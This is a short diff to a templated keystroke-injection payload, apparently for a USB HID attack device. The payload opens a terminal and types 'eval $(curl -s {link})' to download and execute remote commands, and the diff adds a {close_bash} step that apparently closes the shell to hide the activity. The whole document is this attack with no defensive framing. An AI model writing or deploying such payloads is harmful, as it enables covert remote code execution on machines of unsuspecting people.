@@ -2,5 +2,5 @@ REM Downloads and executes commands
 DELAY {start_delay}
 CTRL-ALT t
 DELAY 400
-STRING eval $(curl -s {link})
+STRING eval $(curl -s {link}){close_bash}
 ENTER
